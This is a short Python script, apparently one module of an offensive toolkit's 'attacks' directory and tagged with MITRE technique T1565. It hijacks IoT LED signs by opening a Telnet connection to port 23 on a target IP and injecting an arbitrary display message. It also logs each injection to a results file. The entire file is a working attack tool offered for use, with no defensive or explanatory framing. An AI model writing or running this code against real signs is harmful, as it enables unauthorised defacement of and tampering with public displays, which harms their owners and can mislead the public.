#!/usr/bin/env python3
# modules/attacks/iot_led_sign_controller.py

import os
import json
import socket
import time
import argparse
from datetime import datetime

LOG_FILE = "results/led_sign_hijack.json"
MITRE_TTP = "T1565"

def log_msg(ip, msg):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "message": msg,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def send_payload(ip, message):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 23))
        s.sendall(message.encode() + b'\n')
        time.sleep(1)
        s.close()
        log_msg(ip, message)
        print(f"[✓] Injected message to LED sign at {ip}")
    except Exception as e:
        print(f"[!] Failed to send message: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Control IoT LED signs over Telnet")
    parser.add_argument("--ip", required=True, help="Target LED sign IP address")
    parser.add_argument("--msg", required=True, help="Message to display")
    args = parser.parse_args()
    send_payload(args.ip, args.msg)
